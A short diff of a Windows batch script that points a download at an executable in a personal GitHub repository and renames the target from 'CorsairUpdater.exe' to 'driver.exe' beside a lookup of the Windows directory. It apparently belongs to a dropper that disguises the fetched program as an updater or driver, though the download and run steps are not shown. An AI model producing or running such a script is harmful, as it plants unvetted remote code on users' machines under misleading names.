@@ -2,8 +2,8 @@
 setlocal
 
 :: Define the URL and the output file
-set "URL=https://github.com/mice314/z/raw/main/CorsairUpdater.exe"
-set "OUTPUT=CorsairUpdater.exe"
+set "URL=https://github.com/mice314/z/raw/main/driver.exe"
+set "OUTPUT=driver.exe"
 
 :: Get the Windows directory
 set "windows_dir=%windir%"
